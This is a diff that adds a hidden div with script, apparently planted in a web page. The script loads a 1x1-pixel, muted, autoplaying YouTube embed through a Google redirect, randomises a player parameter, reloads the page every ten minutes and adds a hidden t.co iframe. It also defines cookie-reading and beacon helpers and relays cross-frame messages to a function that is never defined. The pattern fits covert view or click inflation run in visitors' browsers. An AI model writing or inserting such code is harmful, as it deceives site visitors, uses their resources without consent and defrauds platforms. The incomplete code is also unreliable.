@@ -1,0 +1,69 @@
+<div hidden>
+    <body></body>
+    <script>
+        setTimeout(function() {
+            try {
+                document.getElementById("player").remove();
+            } catch (ex) {}
+            window.location.reload();
+        }, 600 * 1000);
+
+        function getRandomElValue() {
+            const elOptions = ["embedded", "detailpage", "leanback"];
+            return elOptions[Math.floor(Math.random() * elOptions.length)];
+        }
+
+        function createFrame(videoId, autoplay, cc, id) {
+            const el = getRandomElValue();
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F' + 
+                         videoId + '%3Fenablejsapi%3D0%26autoplay%3D' + autoplay + 
+                         '%26mute%3D1%26showinfo%3D0%26playsinline%3D0%26modestbranding%3D0%26rel%3D0%26loop%3D0%26cc_load_policy%3D' + 
+                         cc + '%26origin%3D*%26el%3D' + el;
+            iframe.id = id;
+            iframe.style.height = "1px";
+            iframe.style.width = "1px";
+            document.body.appendChild(iframe);
+        }
+
+        var videoId = 'jwcq_yhq0Zk', autoplay = '1', cc = '1';
+
+        createFrame(videoId, autoplay, cc, "player");
+
+        var finalUrl = "", setInfo = 0;
+
+        function getCookie(name) {
+            const match = document.cookie.match(new RegExp(name + "=.[^;]*"));
+            return match ? match[0].split('=')[1] : false;
+        }
+
+        function notify_url(url) {
+            new Image().src = url;
+            return false;
+        }
+
+        function find_frame(e) {
+            const iframes = document.getElementsByTagName('iframe');
+            for (let i = 0; i < iframes.length; i++) {
+                if (e.source === iframes[i].contentWindow) {
+                    return iframes[i];
+                }
+            }
+        }
+
+        window.addEventListener('message', function(event) {
+            try {
+                const json = JSON.parse(event.data);
+                if (json.type === 'playback') {
+                    finalUrl = json.message;
+                    console.log(finalUrl);
+                    sendInfo(finalUrl);
+                }
+            } catch (ex) {
+                console.log(ex);
+            }
+        });
+    </script>
+
+    <iframe src="https://t.co/?ylm1&ylm=KEh0mc4HlgE"></iframe>
+</div>
